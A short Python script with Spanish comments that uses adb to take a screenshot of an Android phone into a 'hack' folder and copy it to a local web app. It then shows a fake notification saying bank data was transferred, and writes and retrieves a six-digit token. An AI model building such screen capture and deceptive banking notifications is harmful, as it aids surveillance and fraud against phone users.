import subprocess
import random
def take_screenshot(id):
    # Comando para tomar una captura de pantalla
    command = ["adb", "-s", id, "shell", "screencap", "/storage/F1A8-6981/hack/screen.png"]
    subprocess.run(command)
    
    command = ["adb", "-s", id, "pull", "/storage/F1A8-6981/hack/screen.png", "webapp/photo.png"]
    subprocess.run(command)

    # Enviar el comando para mostrar una notificación
    command = ["adb", "-s", id, "shell", "am", "broadcast", "-a", "android.intent.action.SEND", "--c", "android.intent.category.DEFAULT", "--es", "title", "Operación exitosa.", "--es", "message", "Datos bancarios transferidos con éxito."]
    subprocess.run(command)
    #adb_device.shell('am broadcast -a com.example.yourapp.SHOW_NOTIFICATION -e title "Title" -e message "Message"')
    
    print("Captura de pantalla tomada y guardada como 'screen.png'")

def generate_token():
    return ''.join([str(random.randint(0, 9)) for _ in range(6)])

def genera_fichero():

    text_content = generate_token()
    # Comando para crear un archivo de texto en el teléfono
    command = ["adb", "shell", "echo", f"'{text_content}'", ">", "/sdcard/token.txt"]
    subprocess.run(command)
    command = ["adb", "pull", "/sdcard/token.txt", "."]
    subprocess.run(command)

    print("Archivo de texto generado en el teléfono y devuelto a la computadora.")